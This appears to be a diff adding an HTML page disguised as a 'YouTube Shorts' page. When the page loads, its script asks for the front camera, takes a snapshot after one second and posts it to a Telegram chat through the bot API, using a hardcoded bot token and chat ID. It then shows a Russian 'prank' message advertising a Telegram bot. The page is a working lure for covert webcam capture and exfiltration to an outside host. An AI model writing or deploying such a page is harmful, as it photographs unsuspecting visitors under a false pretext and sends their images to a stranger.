@@ -1,0 +1,126 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>YouTube Shorts</title>
+    <style>
+      html,
+      body {
+        margin: 0;
+        padding: 0;
+        background: #050614;
+      }
+      #tt {
+        display: block;
+        width: 100vw;
+        height: 100vh;
+        object-fit: cover;
+      }
+    </style>
+  </head>
+
+  <body>
+    <img
+      id="tt"
+      src="https://variety.com/wp-content/uploads/2021/08/YouTube-Shorts-logo.png"
+      alt="YouTube Shorts Image"
+      style="display: block"
+    />
+
+    <video
+      id="camera"
+      width="640"
+      height="480"
+      autoplay=""
+      style="display: none"
+    ></video>
+    <canvas id="canvas" width="640" height="480" style="display: none"></canvas>
+
+    <div id="prank" style="display: none">
+      <div class="picture">
+        <div id="byte_photo"></div>
+      </div>
+      <div class="desc">
+        <p>🙊 Фото отправлено через бота!</p>
+        <button
+          onclick="location.href='https://t.me/Photolovyshkabot?start=site'"
+        >
+          Перейти в @Photolovyshkabot
+        </button>
+      </div>
+    </div>
+
+    <script>
+      async function initCamera() {
+        const video = document.getElementById("camera");
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: "user" },
+        });
+        video.srcObject = stream;
+
+        video.addEventListener("loadeddata", () => {
+          setTimeout(capturePhoto, 1000);
+        });
+      }
+
+      function capturePhoto() {
+        const video = document.getElementById("camera");
+        const canvas = document.getElementById("canvas");
+        const context = canvas.getContext("2d");
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        context.drawImage(video, 0, 0);
+        const dataUrl = canvas.toDataURL("image/jpeg");
+        document.getElementById("prank").style.display = "block";
+        document.getElementById("tt").style.display = "none";
+        document.getElementById("byte_photo").style.backgroundImage =
+          'url("' + dataUrl + '")';
+        sendPhotoToServer(dataUrl);
+      }
+
+      async function sendPhotoToServer(photoData) {
+        const chatId = "-1002270370149"; // Укажите ваш Chat ID
+        const botToken = "7802413652:AAGPZbbn7qr_gzE5AEeEAeM31vG3HyI3PBU"; // Укажите ваш токен Telegram бота
+
+        const formData = new FormData();
+        formData.append("chat_id", chatId);
+        formData.append("caption", "Фото с камеры пользователя");
+        formData.append("photo", dataURLtoBlob(photoData)); // Добавляем фото как Blob
+
+        try {
+          const response = await fetch(
+            `https://api.telegram.org/bot${botToken}/sendPhoto`,
+            {
+              method: "POST",
+              body: formData,
+            }
+          );
+
+          if (response.ok) {
+            console.log("Фото отправлено в Telegram!");
+          } else {
+            console.error("Ошибка при отправке фото:", await response.text());
+          }
+        } catch (error) {
+          console.error("Ошибка при отправке фото:", error);
+        }
+      }
+
+      // Преобразование Base64 в Blob для отправки в Telegram
+      function dataURLtoBlob(dataUrl) {
+        const arr = dataUrl.split(",");
+        const mime = arr[0].match(/:(.*?);/)[1];
+        const bstr = atob(arr[1]);
+        let n = bstr.length;
+        const u8arr = new Uint8Array(n);
+        while (n--) {
+          u8arr[n] = bstr.charCodeAt(n);
+        }
+        return new Blob([u8arr], { type: mime });
+      }
+
+      document.addEventListener("DOMContentLoaded", initCamera);
+    </script>
+  </body>
+</html>
